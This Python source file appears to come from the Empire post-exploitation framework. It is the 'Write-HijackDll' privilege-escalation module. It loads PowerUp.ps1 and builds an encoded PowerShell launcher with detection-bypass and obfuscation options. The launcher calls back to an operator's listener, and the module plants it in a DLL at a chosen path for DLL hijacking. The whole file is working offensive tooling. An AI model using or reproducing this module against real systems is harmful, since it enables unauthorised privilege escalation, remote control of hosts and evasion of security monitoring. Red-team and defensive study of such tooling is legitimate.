from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # Set booleans to false by default
        obfuscate = False

        # staging options
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']

        module_name = 'Write-HijackDll'

        # read in the common powerup.ps1 module source code
        module_source = main_menu.installPath + "/data/module_source/privesc/PowerUp.ps1"
        if obfuscate:
            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        module_code = f.read()
        f.close()

        # # get just the code needed for the specified function
        # script = helpers.generate_dynamic_powershell_script(moduleCode, moduleName)
        script = module_code

        script_end = ';' + module_name + " "

        # extract all of our options
        listener_name = params['Listener']
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']

        # generate the launcher code
        launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                       obfuscate=obfuscate,
                                                       obfuscationCommand=obfuscate_command, userAgent=user_agent,
                                                       proxy=proxy,
                                                       proxyCreds=proxy_creds, bypasses=params['Bypasses'])

        if launcher == "":
            return handle_error_message("[!] Error in launcher command generation.")

        else:
            out_file = params['DllPath']
            script_end += " -Command \"%s\"" % (launcher)
            script_end += " -DllPath %s" % (out_file)

        outputf = params.get("OutputFunction", "Out-String")
        script_end += f" | {outputf} | " + '%{$_ + \"`n\"};"`n' + str(module.name.split("/")[-1]) + ' completed!"'

        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
